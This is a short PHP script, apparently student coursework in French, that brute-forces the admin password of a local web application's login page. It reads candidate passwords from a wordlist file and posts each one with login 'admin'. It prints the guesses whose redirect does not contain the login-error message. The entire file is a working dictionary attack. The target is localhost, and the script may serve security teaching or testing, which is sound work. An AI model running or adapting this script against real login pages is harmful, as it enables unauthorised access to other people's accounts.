<?php
$objetRequete = curl_init();
curl_setopt($objetRequete, CURLOPT_URL,'http://localhost/MERLET/Fichiers_sprint_12/index.php?vue=Connexion&action=Verification');
curl_setopt($objetRequete, CURLOPT_RETURNTRANSFER, true);
curl_setopt($objetRequete, CURLOPT_FOLLOWLOCATION, true);
$fichier = fopen("C:\wamp64\www\MERLET\Fichiers_sprint_12\attaque\listeMDP.txt", "r");
if ($fichier)
{
    while (($motDePasseCourant = fgets($fichier)) !== false)
    {
        $chaineParametre = 'role=1&login=admin&pwd='.rtrim($motDePasseCourant).'';
        curl_setopt($objetRequete, CURLOPT_POSTFIELDS, $chaineParametre);
        $response = curl_exec($objetRequete);
        $redirectionURL = curl_getinfo($objetRequete, CURLINFO_EFFECTIVE_URL);

        if(curl_error($objetRequete))
        {
            trigger_error('Curl Error' . curl_error($objetRequete));
        }

        if(!strpos($redirectionURL, 'Erreur de connexion'))
        {
            echo "mot de passe possible : ".rtrim($motDePasseCourant)." - ".$redirectionURL."\n";
        }
    }
fclose(($fichier));
}
else 
{
    echo "erreur à l'ouverture du fichier";
}
curl_close($objetRequete);

?>